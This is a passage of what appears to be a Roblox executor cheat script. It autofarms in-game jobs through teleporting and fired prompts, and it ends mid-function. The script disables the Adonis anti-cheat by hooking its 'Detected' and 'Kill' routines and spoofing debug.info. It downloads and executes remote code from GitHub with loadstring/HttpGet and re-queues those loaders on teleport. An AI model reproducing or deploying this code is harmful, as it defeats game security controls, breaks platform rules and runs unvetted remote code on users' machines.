local genv = getgenv()
local fenv = getfenv()

local function _crash()
end

local function verifyFunction(func)
    if typeof(func) ~= "function" then _crash() end
    if islclosure and not islclosure(func) then _crash() end
    if iscclosure and iscclosure(func) then _crash() end
    return true
end

local targetUrl1 = 'https://raw.githubusercontent.com/LynX99-9/komtolmmek2/refs/heads/main/Adonis'
local targetUrl2 = 'https://sirius.menu/rayfield'

if #targetUrl1 ~= 77 or #targetUrl2 ~= 28 then
    _crash()
end

loadstring(game:HttpGet(targetUrl1))()

pcall(function()
    local networkPause = game:GetService('CoreGui').RobloxGui:FindFirstChild('CoreScripts/NetworkPause')
    if networkPause then
        networkPause:Destroy()
    end
end)

local Rayfield = loadstring(game:HttpGet(targetUrl2))()

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local RunService = game:GetService("RunService")
local PlayerData = LP:WaitForChild("PlayerData")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local TeleportService = game:GetService("TeleportService")

-- ── Adonis bypass: wrap all executor globals in newcclosure ────────────────────────
local _fireproximityprompt = newcclosure(function(prompt, ...)
    return fireproximityprompt(prompt, ...)
end)

local _firesignal = firesignal and newcclosure(function(sig, ...)
    return firesignal(sig, ...)
end) or nil

local _hookfunction = hookfunction and newcclosure(function(a, b)
    return hookfunction(a, b)
end) or nil

local _getgc = getgc and newcclosure(function(...)
    return getgc(...)
end) or nil

local _newcclosure = newcclosure
-- ──────────────────────────────────────────────────────────────────────────────────

local CourierSettings = require(ReplicatedStorage:WaitForChild("Delivery System"):WaitForChild("Settings"))
local MachinePrompt = workspace.BaristaJob.Interactions.MachinePart.MachinePart.MachinePrompt
local RegisterPrompt = workspace.BaristaJob.Interactions.RegisterPart.RegisterPart.RegisterPrompt
local SupplyPrompt = workspace.BaristaJob.Interactions.SupplyPart.SupplyPart.SupplyPrompt
local JobPrompt = workspace.BaristaJob.Interactions.StartPart.StartPart.JobPrompt

local SupplyCF = CFrame.new(-5116.78418, 5.78931046, -670.858887)
local MachineCF = CFrame.new(-4997.1665, 1.58353043, -795.047607)
local RegisterCF = CFrame.new(-4994.06934, 1.30402756, -760.247437)
local StartJobCF = CFrame.new(-4989.80078, 5.30382967, -715.013062)
local TAKE_BOX_CFRAME = CFrame.new(-5105.61182, 4.48948574, -3758.98267)
local TAKE_PROMPT = workspace:WaitForChild("Livrason"):WaitForChild("Take1"):WaitForChild("Take"):WaitForChild("ProximityPrompt")

_G.AutofarmCourier = false
_G.CourierSpeed = 230
_G.AutoFarmBarista = false
_G.BaristaSpeed = 300
_G.AutoPoliceEnabled = false
_G.blackscreen = false
_G.PermanentBlackscreen = false

_G.AutoWebhook = false
_G.WebhookURL = ""
_G.TotalEarning = 0
_G.CycleCount = 0
_G.StartTime = os.time()
LastActivity = tick()

repeat task.wait(0.5) until PlayerData:FindFirstChild("RPValue") and PlayerData.RPValue.Value > 0

local lastMoney = PlayerData.RPValue.Value
local pendingIncome = 0
local isRunning = false
local cooldownTime = 60
local WaktuKosong = nil

_G.CourierEarned = 0
_G.BaristaEarned = 0
_G.PoliceEarned = 0

local AutoPoliceConfig = {
    TeleportSpeed = {min = 200, max = 300},
    PostTeleportWait = {min = 2, max = 4},
    WalkTimeout = 10,
    TargetOffset = 15,
    LoopDelay = 1
}
local ActiveConnections = {}
local NeedJobRefresh, RequestingJob = false, false
local TeleportActive = false
local missionsCompleted = 0
local AnchoredPartsList = {}
local ActiveMissions = Workspace:WaitForChild("ActiveMissions", 10)

local function generateRandomName()
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local length = math.random(12, 24)
    local randomString = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        randomString = randomString .. string.sub(chars, rand, rand)
    end
    return randomString
end

local isRejoining = false
local function RejoinServer()
    if isRejoining then return end
    isRejoining = true

    local queue_teleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)

    _G.AutofarmCourier = false
    _G.AutoFarmBarista = false
    _G.AutoPoliceEnabled = false

    Rayfield:Notify({
        Title = "Projectsion",
        Content = "Rejoining server safely...",
        Duration = 3
    })
    task.wait(2)

    if queue_teleport then
        queue_teleport([[
            repeat task.wait() until game:IsLoaded()
            task.wait(4)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/LynX99-9/komtolmmek2/refs/heads/main/Adonis"))()
            end)
            task.wait(1)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/luxxidroblox-code/myscript.lua/refs/heads/main/doc.lua"))()
            end)
            task.spawn(function()
                local m = game:GetService("ReplicatedStorage"):WaitForChild("menuToggleRequest", 20)
                if m then m:FireServer(false) end
            end)
        ]])
    end

    pcall(function()
        if #Players:GetPlayers() <= 1 then
            TeleportService:Teleport(game.PlaceId, LP)
        else
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end
    end)
end

task.spawn(function()
    while task.wait(2) do
        if _G.AutofarmCourier and _G.CourierEarned >= 79000000 and not isRejoining then
            Rayfield:Notify({
                Title = "Courier Target Reached",
                Content = "Target penghasilan Kurir (79 Juta) tercapai. Memulai Rejoin...",
                Duration = 5,
                Image = 4483362458,
            })
            task.wait(1)
            RejoinServer()
            break
        end
    end
end)

local BlackScreen = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")

if gethui then
    BlackScreen.Parent = gethui()
else
    BlackScreen.Parent = game:GetService("CoreGui") or LP.PlayerGui
end

BlackScreen.Name = generateRandomName()
Frame.Name = generateRandomName()

BlackScreen.DisplayOrder = -1
BlackScreen.Enabled = false

Frame.Parent = BlackScreen
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Size = UDim2.new(1.5, 0, 1.5, 0)
Frame.Position = UDim2.new(-0.25, 0, -0.25, 0)
Frame.BorderSizePixel = 0

Frame:GetPropertyChangedSignal("Size"):Connect(function()
    if Frame.Size ~= UDim2.new(1.5, 0, 1.5, 0) then
        Frame.Size = UDim2.new(1.5, 0, 1.5, 0)
    end
end)

Frame:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
    if Frame.BackgroundTransparency ~= 0 then
        Frame.BackgroundTransparency = 0
    end
end)

Frame:GetPropertyChangedSignal("Visible"):Connect(function()
    if Frame.Visible == false and _G.PermanentBlackscreen then
        Frame.Visible = true
    end
end)

local function updateBlackScreen()
    verifyFunction(updateBlackScreen)
    
    -- Forced disabled to remove blackscreen permanently
    _G.blackscreen = false
    _G.PermanentBlackscreen = false

    BlackScreen.Enabled = false
    Frame.Visible = false
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.U then
        _G.blackscreen = not _G.blackscreen
        updateBlackScreen()
        Rayfield:Notify({
            Title = "Blackscreen Toggle",
            Content = "Blackscreen: " .. (_G.blackscreen and "ENABLED" or "DISABLED"),
            Duration = 2
        })
    end
end)

local function SwitchToCourier()
    local Event = ReplicatedStorage:WaitForChild("JobEvents"):WaitForChild("TeamChangeRequest")
    if not LP.Team or LP.Team.Name ~= "Courier" then
        Event:FireServer("Courier", 11378976, 1, 0, "MainMenu")
        task.wait(2)
    end
end

local function SwitchToPolice()
    local Event = ReplicatedStorage:WaitForChild("JobEvents"):WaitForChild("TeamChangeRequest")
    if not LP.Team or LP.Team.Name ~= "Police" then
        Event:FireServer("Police", 0, 0, 1428858969, "MainMenu")
        task.wait(2)
    end
end

local function Tween(targetCFrame)
    local Char = LP.Character
    local Root = Char and Char:FindFirstChild("HumanoidRootPart")
    if not Root then return end

    local distance = (Root.Position - targetCFrame.Position).Magnitude
    local duration = distance / _G.CourierSpeed

    Root.Anchored = true
    Root.Velocity = Vector3.new(0, 0, 0)
    Root.RotVelocity = Vector3.new(0, 0, 0)

    local info = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(Root, info, {CFrame = targetCFrame})
    tween:Play()
    tween.Completed:Wait()

    Root.Velocity = Vector3.new(0, 0, 0)
    Root.Anchored = false
end

local function AutoEquipBox()
    local Char = LP.Character
    if not Char or not Char:FindFirstChild("Humanoid") then return false end
    local held = Char:FindFirstChildOfClass("Tool")
    if held and held.Name:lower() == "box" then return true end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, item in pairs(bp:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower() == "box" then
                Char.Humanoid:EquipTool(item)
                return true
            end
        end
    end
    return false
end

local function GetActivePoint()
    for _, folder in ipairs(CourierSettings.Folder.Location:GetChildren()) do
        local block = folder:FindFirstChild("Block")
        local prompt = block and block:FindFirstChildOfClass("ProximityPrompt")
        if prompt and (prompt.Enabled or folder:FindFirstChild("POINT").billboardgui.Enabled) then
            return block, prompt
        end
    end
    return nil, nil
end

task.spawn(function()
    local VirtualUser = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end)

local function getAvatar()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
end

local function formatRP(v)
    local s = string.format("%.0f", v)
    local formatted = s:reverse():gsub("(%d%d%d)", "%1."):reverse():gsub("^%.", "")
    return "RP. " .. formatted
end

local function getRunningTime()
    local diff = os.time() - _G.StartTime
    return string.format("%02d:%02d:%02d", math.floor(diff/3600), math.floor((diff%3600)/60), diff%60)
end

local function sendWebhook(income, target)
    if _G.WebhookURL == "" or not _G.WebhookURL:find("discord.com") then return end

    _G.CycleCount = _G.CycleCount + 1

    local currentMoney = PlayerData.RPValue.Value
    local http_request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)

    local embed = {
        ["author"] = {["name"] = "Projectsion Webhook", ["icon_url"] = getAvatar()},
        ["title"] = "Cycle Completed",
        ["color"] = 0xFFFFFF,
        ["fields"] = {
            {["name"] = "Username", ["value"] = LP.Name, ["inline"] = false},
            {["name"] = "Cycle Income", ["value"] = formatRP(income), ["inline"] = false},
            {["name"] = "Target", ["value"] = formatRP(target), ["inline"] = false},
            {["name"] = "Current Money", ["value"] = formatRP(currentMoney) .. " (Est)", ["inline"] = false},
            {["name"] = "Total Earning", ["value"] = formatRP(_G.TotalEarning) .. " (Est)", ["inline"] = false},
            {["name"] = "Cycle Count", ["value"] = tostring(_G.CycleCount), ["inline"] = false},
            {["name"] = "Running Time", ["value"] = getRunningTime(), ["inline"] = false}
        },
        ["image"] = {["url"] = "https://cdn.discordapp.com/attachments/1492837859370074192/1508063383944036433/IMG_20260524_180509.jpg?ex=6a142cf9&is=6a12db79&hm=124ec4dccb5d72326d9b0776d912bb18631948f41162cd9fa6d08eafcff19fb4&"},
        ["footer"] = {["text"] = "Made By Projectsion | " .. os.date("%m/%d/%Y %I:%M %p")}
    }

    local payload = HttpService:JSONEncode({["username"] = "Projectsion Reports", ["embeds"] = {embed}})

    if http_request then
        pcall(function()
            http_request({
                Url = _G.WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

local lblTotalEarned, lblCurrentMoney, lblSessionTime
local lblCourierEarned, lblBaristaEarned, lblPoliceEarned

PlayerData.RPValue.Changed:Connect(function(newMoney)
    if newMoney > lastMoney then
        local gained = newMoney - lastMoney
        if gained < 50000000 then
            pendingIncome = pendingIncome + gained
            _G.TotalEarning = _G.TotalEarning + gained

            if _G.AutofarmCourier and (LP.Team and LP.Team.Name == "Courier") then
                _G.CourierEarned = _G.CourierEarned + gained
            elseif _G.AutoFarmBarista and (LP.Team and LP.Team.Name == "Barista") then
                _G.BaristaEarned = _G.BaristaEarned + gained
            elseif _G.AutoPoliceEnabled and (LP.Team and LP.Team.Name == "Police") then
                _G.PoliceEarned = _G.PoliceEarned + gained
            end

            if lblTotalEarned then lblTotalEarned:Set("Total Earned: " .. formatRP(_G.TotalEarning)) end
            if lblCurrentMoney then lblCurrentMoney:Set("Current Money: " .. formatRP(newMoney)) end
            if lblCourierEarned then lblCourierEarned:Set("Courier: " .. formatRP(_G.CourierEarned)) end
            if lblBaristaEarned then lblBaristaEarned:Set("Barista: " .. formatRP(_G.BaristaEarned)) end
            if lblPoliceEarned then lblPoliceEarned:Set("Police Department: " .. formatRP(_G.PoliceEarned)) end
        end

        if not isRunning then
            isRunning = true
            task.spawn(function()
                while isRunning do
                    task.wait(60)
                    if pendingIncome > 0 and _G.WebhookURL ~= "" then
                        sendWebhook(pendingIncome, 0)
                        pendingIncome = 0
                    end
                    if not _G.AutofarmCourier and not _G.AutoFarmBarista and not _G.AutoPoliceEnabled then
                        isRunning = false
                    end
                end
            end)
        end
    elseif newMoney < lastMoney then
        if lblCurrentMoney then lblCurrentMoney:Set("Current Money: " .. formatRP(newMoney)) end
    end
    lastMoney = newMoney
end)

local function GetBaristaElements()
    local Gui = LP.PlayerGui:FindFirstChild("BaristaGUI")
    if Gui then
        local OrderText = Gui:FindFirstChild("StatusFrame") and Gui.StatusFrame:FindFirstChild("OrderText")
        local Minigame = Gui:FindFirstChild("MinigameFrame")
        return Gui, OrderText, Minigame
    end
    return nil, nil, nil
end

local function GetRemote(name)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name == name then return v end
    end
    return nil
end

local function BypassTP(targetCF)
    local Char = LP.Character or LP.CharacterAdded:Wait()
    local Hum = Char:WaitForChild("Humanoid")
    local Root = Char:WaitForChild("HumanoidRootPart")
    if not Hum or not Root then return end

    if Hum.SeatPart then
        local weld = Hum.SeatPart:FindFirstChild("SeatWeld")
        if weld then weld:Destroy() end
        Hum.Sit = false
        task.wait(0.15)
    end

    local distance = (Root.Position - targetCF.Position).Magnitude
    local duration = distance / _G.BaristaSpeed

    Root.Anchored = true
    Root.Velocity = Vector3.new(0, 0, 0)
    Root.RotVelocity = Vector3.new(0, 0, 0)

    local info = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(Root, info, {CFrame = targetCF})
    tween:Play()
    tween.Completed:Wait()

    Root.Velocity = Vector3.new(0, 0, 0)
    Root.Anchored = false
    task.wait(0.3)
end

local function ExecuteStartSequence()
    local tr = GetRemote("TeamChangeRequest")

    if LP.Team and LP.Team.Name ~= "Barista" and tr then
        tr:FireServer("Barista", 11378976, 0, 0, "Detector")
        task.wait(2.5)
    end

    BypassTP(StartJobCF)
    task.wait(0.8)

    if JobPrompt and JobPrompt.Enabled then
        task.defer(function() _fireproximityprompt(JobPrompt) end)
    end

    LastActivity = tick()
end

task.spawn(function()
    while task.wait(0.6) do
        if _G.AutoFarmBarista then
            local _, OrderTextLabel, MinigameFrame = GetBaristaElements()

            if tick() - LastActivity >= 240 then
                ExecuteStartSequence()
            end

            if OrderTextLabel then
                local txt = OrderTextLabel.Text:lower()
                local isBroken = (OrderTextLabel.TextColor3.R > 0.8 and (txt:find("break") or txt:find("down")))

                if isBroken then
                    BypassTP(SupplyCF)
                    task.wait(0.5)
                    task.defer(function() _fireproximityprompt(SupplyPrompt) end)
                    LastActivity = tick()
                    task.wait(0.5)
                    BypassTP(MachineCF)
                    task.defer(function() _fireproximityprompt(MachinePrompt) end)
                elseif MachinePrompt.Enabled and not (MinigameFrame and MinigameFrame.Visible) then
                    BypassTP(MachineCF)
                    task.defer(function() _fireproximityprompt(MachinePrompt) end)
                    LastActivity = tick()
                    repeat task.wait(0.5)
                        LastActivity = tick()
                    until not (MinigameFrame and MinigameFrame.Visible) or not _G.AutoFarmBarista
                elseif RegisterPrompt.Enabled and not (MinigameFrame and MinigameFrame.Visible) then
                    task.wait(0.5)
                    BypassTP(RegisterCF)
                    task.wait(0.5)
                    task.defer(function() _fireproximityprompt(RegisterPrompt) end)
                    LastActivity = tick()
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    local _, _, MinigameFrame = GetBaristaElements()
    if _G.AutoFarmBarista and MinigameFrame and MinigameFrame.Visible then
        local tz = MinigameFrame:FindFirstChild("TargetZone", true)
        if tz then tz.Size = UDim2.new(1, 0, 1, 0); tz.Position = UDim2.new(0, 0, 0, 0) end
    end
end)

task.spawn(function()
    while true do
        task.wait(1)

        if _G.AutofarmCourier then
            SwitchToCourier()

            local Char = LP.Character or LP.CharacterAdded:Wait()
            local Hum = Char:WaitForChild("Humanoid")
            local Root = Char:WaitForChild("HumanoidRootPart")

            if Hum and Root and Hum.Health > 0 then
                local BoxTempatAmbil = workspace:FindFirstChild("Livrason") and workspace.Livrason:FindFirstChild("Take1")
                local TargetBlock, TargetPrompt = GetActivePoint()

                if not BoxTempatAmbil or (AutoEquipBox() and not TargetBlock) then
                    task.wait(2)
                    continue
                end

                if not AutoEquipBox() then
                    if not WaktuKosong then
                        WaktuKosong = os.clock()
                    end

                    if (os.clock() - WaktuKosong) >= 240 then
                        local args = {"Civilian", 0, 0, 0, "MainMenu"}
                        game:GetService("ReplicatedStorage"):WaitForChild("JobEvents"):WaitForChild("TeamChangeRequest"):FireServer(unpack(args))

                        WaktuKosong = nil

                        repeat
                            task.wait(1)
                        until (LP.Team and LP.Team.Name == "Civilian") or not _G.AutofarmCourier

                        task.wait(15)
                        continue
                    end
                else
                    WaktuKosong = nil
                end

                if not Hum.Sit then
                    local sitAttempts = 0
                    while not Hum.Sit and sitAttempts < 5 and _G.AutofarmCourier do
                        Hum.Sit = true
                        task.wait(0.5)
                        sitAttempts = sitAttempts + 1
                    end
                    if not Hum.Sit then
                        task.wait(1)
                        continue
                    end
                    task.wait(1)
                end

                if not AutoEquipBox() then
                    Tween(TAKE_BOX_CFRAME)
                    task.wait(0.5)

                    if _G.AutofarmCourier and TAKE_PROMPT.Enabled then
                        task.defer(function() _fireproximityprompt(TAKE_PROMPT) end)
                        task.wait(1.5)
                    end
                else
                    if TargetBlock and TargetPrompt then
                        task.wait(math.random(0, 1))

                        if Hum.SeatPart then
                            local weld = Hum.SeatPart:FindFirstChild("SeatWeld")
                            if weld then weld:Destroy() end
                            Hum.Sit = false
                            task.wait(0.15)
                        end

                        Tween(TargetBlock.CFrame * CFrame.new(0, 2, 0))
                        task.wait(0.8)

                        AutoEquipBox()

                        if _G.AutofarmCourier and TargetPrompt.Enabled then
                            task.defer(function() _fireproximityprompt(TargetPrompt) end)
                            task.wait(3.5)
                        end
                    end
                end
            end
        else
            WaktuKosong = nil
        end
    end
end)

-- ── Adonis bypass: defer getgc hook 8s to let Adonis finish loading ────────────────
task.delay(8, function()
    local d = false
    local h = {}
    local x, y
    setthreadidentity(2)
    if _getgc then
        for i, v in _getgc(true) do
            if typeof(v) == "table" then
                local a = rawget(v, "Detected")
                local b = rawget(v, "Kill")
                if typeof(a) == "function" and not x then
                    x = a
                    local o; o = _hookfunction(x, _newcclosure(function(c, f, n)
                        return true
                    end))
                    table.insert(h, x)
                end
                if rawget(v, "Variables") and rawget(v, "Process") and typeof(b) == "function" and not y then
                    y = b
                    local o; o = _hookfunction(y, _newcclosure(function(f)
                    end))
                    table.insert(h, y)
                end
            end
        end
    end
    if _hookfunction then
        local o; o = _hookfunction(getrenv().debug.info, _newcclosure(function(...)
            local a, f = ...
            if x and a == x then return coroutine.yield(coroutine.running()) end
            return o(...)
        end))
    end
    setthreadidentity(7)
end)
-- ──────────────────────────────────────────────────────────────────────────────────

pcall(function()
    local getconnections = getconnections or get_signal_cons
    if getconnections then
        for _, conn in ipairs(getconnections(LP.Idled)) do
            if conn.Disable then conn:Disable() elseif conn.Disconnect then conn:Disconnect() end
        end
    end
end)

local idledConn = LP.Idled:Connect(function()
    pcall(function()
        local VirtualUser = game:GetService("VirtualUser")
        VirtualUser:CaptureController()
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(0.2)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)
end)
table.insert(ActiveConnections, idledConn)

local function getPoliceUI()
    local pGui = LP:FindFirstChild("PlayerGui")
    return pGui and pGui:FindFirstChild("PoliceUI")
end

local function GetLocationLabelText()
    local ui = getPoliceUI()
    local label = ui and ui:FindFirstChild("LocationLabel", true)
    return label and label.Text
end

local function WaitUntilAssigned()
    while _G.AutoPoliceEnabled and GetLocationLabelText() == "Awaiting assignment..." do task.wait(0.5) end
end

local function GetObjectiveProgress()
    local ui = getPoliceUI()
    local label = ui and ui:FindFirstChild("ObjectiveLabel", true)
    if label and label.Text then
        local text = label.Text:gsub("%s+", "")
        if text == "" then return "empty", nil end
        local current, target = label.Text:match("(%d+)/(%d+)")
        if current and target then return tonumber(current), tonumber(target) end
    end
    return nil, nil
end

local function GetObjectiveDetailedProgress()
    local ui = getPoliceUI()
    local label = ui and ui:FindFirstChild("ObjectiveLabel", true)
    if label and label.Text then
        local text = label.Text:lower()
        if text:gsub("%s+", "") == "" then return nil, nil, nil, nil end
        local currentLines, targetLines = text:match("(%d+)/(%d+)%s+police%s+line")
        local currentCones, targetCones = text:match("(%d+)/(%d+)%s+cone")
        if not currentLines and not currentCones then
            local cur, tar = text:match("(%d+)/(%d+)")
            if cur and tar then
                if text:find("cone") then currentCones, targetCones = cur, tar else currentLines, targetLines = cur, tar end
            end
        end
        return tonumber(currentLines), tonumber(targetLines), tonumber(currentCones), tonumber(targetCones)
    end
    return nil, nil, nil, nil
end

local function UnanchorAll()
    for _, part in ipairs(AnchoredPartsList) do
        if part and part.Parent then pcall(function() part.Anchored = false end) end
    end
    table.clear(AnchoredPartsList)
    local Character = LP.Character
    if Character then
        for _, part in ipairs(Character:GetDescendants()) do
            if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
        end
    end
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    if Humanoid then
        pcall(function()
            local seat = Humanoid.SeatPart
            if seat then
                local weld = seat:FindFirstChild("SeatWeld")
                if weld then weld:Destroy() end
            end
            Humanoid.Sit = false
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            task.wait(0.15)
            Humanoid.Jump = true
            local HRP = Character:FindFirstChild("HumanoidRootPart")
            if HRP then HRP.CFrame = HRP.CFrame + Vector3.new(0, 0.5, 0) end
        end)
    end
end

local function LerpTeleport(HRP, destCFrame, duration)
    HRP.Anchored = true
    HRP.Velocity = Vector3.new(0, 0, 0)
    HRP.RotVelocity = Vector3.new(0, 0, 0)

    local tween = TweenService:Create(HRP, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = destCFrame})
    tween:Play()
    tween.Completed:Wait()

    HRP.Velocity = Vector3.new(0, 0, 0)
    HRP.Anchored = false
end

local function SafePoliceTeleport(targetCFrame, bypassChecks, preventUnsit, skipSit)
    if not bypassChecks and not _G.AutoPoliceEnabled then return end
    local Character = LP.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not Humanoid or not HRP then return end
    TeleportActive = true
    pcall(function()
        local isDriving = (Humanoid.SeatPart ~= nil and Humanoid.SeatPart:IsA("VehicleSeat"))
        local destCFrame = targetCFrame + (isDriving and Vector3.new(0, 10, 0) or Vector3.new(0, 1.5, 0))
        local mainPart, vehicle = HRP, nil
        if isDriving then
            local seat = Humanoid.SeatPart
            vehicle = seat:FindFirstAncestorOfClass("Model")
            mainPart = (vehicle and vehicle.PrimaryPart) or seat
        else
            local distance = (destCFrame.Position - HRP.Position).Magnitude
            if distance > 80 then skipSit = false end
            if Humanoid.SeatPart then
                pcall(function()
                    local seat = Humanoid.SeatPart
                    local weld = seat:FindFirstChild("SeatWeld")
                    if weld then weld:Destroy() end
                    Humanoid.Sit = false
                    task.wait(0.1)
                end)
            end
            if not skipSit then
                Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                if not Humanoid.Sit then
                    local attempts = 0
                    while not Humanoid.Sit and _G.AutoPoliceEnabled and attempts < 3 do
                        Humanoid.Sit = true
                        task.wait(0.2)
                        attempts = attempts + 1
                    end
                    task.wait(0.2)
                end
            end
        end

        if Character then
            for _, part in ipairs(Character:GetDescendants()) do
                if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
            end
        end

        local distance = (destCFrame.Position - mainPart.Position).Magnitude
        local speedConf = AutoPoliceConfig.TeleportSpeed
        local speed = math.random(speedConf.min, speedConf.max)
        local duration = distance / speed

        if duration > 0 then
            if isDriving then
                if vehicle then
                    for _, p in ipairs(vehicle:GetDescendants()) do if p:IsA("BasePart") then p.Anchored = false end end
                end
                mainPart.Velocity = Vector3.new(0,0,0)
                mainPart.RotVelocity = Vector3.new(0,0,0)
                local tween = TweenService:Create(mainPart, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = destCFrame})
                local connection; connection = RunService.Stepped:Connect(function()
                    if tween.PlaybackState == Enum.PlaybackState.Playing then
                        pcall(function()
                            mainPart.Velocity = Vector3.new(0,0,0)
                            mainPart.RotVelocity = Vector3.new(0,0,0)
                            if vehicle and vehicle.PrimaryPart then
                                vehicle.PrimaryPart.Velocity = Vector3.new(0,0,0)
                                vehicle.PrimaryPart.RotVelocity = Vector3.new(0,0,0)
                            end
                        end)
                    else
                        if connection then connection:Disconnect() end
                    end
                end)
                tween:Play()
                tween.Completed:Wait()
                if connection then connection:Disconnect() end
            else
                LerpTeleport(HRP, destCFrame, duration)
            end
            mainPart.Velocity = Vector3.new(0,0,0)
            mainPart.RotVelocity = Vector3.new(0,0,0)
        else
            if isDriving then
                if vehicle then vehicle:PivotTo(destCFrame) else mainPart.CFrame = destCFrame end
            else
                Character:PivotTo(destCFrame)
            end
        end

        if not preventUnsit then
            if not isDriving and Humanoid then
                Humanoid.Sit = false
                Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            end
            UnanchorAll()
        end
        local postWait = AutoPoliceConfig.PostTeleportWait
        if postWait and not skipSit then task.wait(math.random(postWait.min, postWait.max)) end
    end)
    TeleportActive = false
end

local function FindMissionPart(missionModel)
    local part = missionModel:FindFirstChild("Part")
    if not part then
        for _, desc in ipairs(missionModel:GetDescendants()) do
            if desc:IsA("BasePart") and desc.Name ~= "Batas" then part = desc break end
        end
    end
    return part
end

local function GetPrompt(missionModel, targetPart)
    local prompt = targetPart and (targetPart:FindFirstChildOfClass("ProximityPrompt") or targetPart:FindFirstChild("ProximityPrompt", true))
    return prompt or missionModel:FindFirstChildOfClass("ProximityPrompt") or missionModel:FindFirstChild("ProximityPrompt", true)
end

local function DisableToolScripts(tool)
    if not tool then return end
    pcall(function()
        local handler = tool:FindFirstChild("PlacementHandler")
        if handler then handler.Disabled = true; handler:Destroy() end
    end)
end

local function EquipToolByName(toolName)
    local Character = LP.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    if not Humanoid then return false end
    if Humanoid.Sit or Humanoid.SeatPart then
        pcall(function()
            local seat = Humanoid.SeatPart
            if seat then
                local weld = seat:FindFirstChild("SeatWeld")
                if weld then weld:Destroy() end
            end
            Humanoid.Sit = false
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            task.wait(0.15)
            Humanoid.Jump = true
        end)
        task.wait(0.8)
    end
    local equippedTool = Character:FindFirstChild(toolName)
    if equippedTool then DisableToolScripts(equippedTool) return true end
    local tool = LP.Backpack:FindFirstChild(toolName)
    if tool then
        DisableToolScripts(tool)
        pcall(function() tool.Parent = Character end)
        task.wait(0.5)
        return true
    end
    return false
end

local function FirePrompt(prompt, targetPart)
    if not prompt or not prompt.Enabled then return false end
    pcall(function()
        prompt.RequiresLineOfSight = false
        if prompt.MaxActivationDistance < 100 then prompt.MaxActivationDistance = 100 end
    end)
    local Character = LP.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    local target = targetPart or prompt.Parent
    for attempt = 1, 3 do
        if not _G.AutoPoliceEnabled then break end
        if not prompt or not prompt.Parent or not prompt.Enabled then return true end
        if HRP and target and target:IsA("BasePart") then
            pcall(function()
                HRP.CFrame = CFrame.new(HRP.Position, Vector3.new(target.Position.X, HRP.Position.Y, target.Position.Z))
                local cam = Workspace.CurrentCamera
                if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, target.Position) end
            end)
            task.wait(0.2)
        end
        local triggered = false
        local success = pcall(function() _fireproximityprompt(prompt) end)
        if success then
            task.wait(0.5)
            if not prompt or not prompt.Parent or not prompt.Enabled then triggered = true; break end
        end
        if not triggered and prompt and prompt.Parent and prompt.Enabled then
            pcall(function()
                prompt:InputHoldBegin()
                task.wait(prompt.HoldDuration + 0.3)
                prompt:InputHoldEnd()
            end)
            task.wait(0.5)
            if not prompt or not prompt.Parent or not prompt.Enabled then triggered = true; break end
        end
    end
    return not (prompt and prompt.Parent and prompt.Enabled)
end

local function RequestPoliceJob()
    local ui = getPoliceUI()
    local container = ui and ui:FindFirstChild("Container")
    if container and container.Visible then return end
    RequestingJob = true
    pcall(function()
        SwitchToPolice()

        local Character = LP.Character
        while not Character or not Character.Parent or not Character:FindFirstChildOfClass("Humanoid") or Character:FindFirstChildOfClass("Humanoid").Health <= 0 do
            if not _G.AutoPoliceEnabled then break end
            task.wait(0.25)
            Character = LP.Character
        end
        NeedJobRefresh = false
        if Character then
            local HRP = Character:WaitForChild("HumanoidRootPart", 10)
            if HRP then
                SafePoliceTeleport(CFrame.new(2839.58398, 3.48455882, -838.377747, 0.999973476, -2.63135558e-08, 0.00728388596, 2.71063172e-08, 1, -1.08738945e-07, -0.00728388596, 1.08933499e-07, 0.999973476))
                UnanchorAll()
                task.wait(1.5)
                local PoliceJob = Workspace:WaitForChild("PoliceJob", 10)
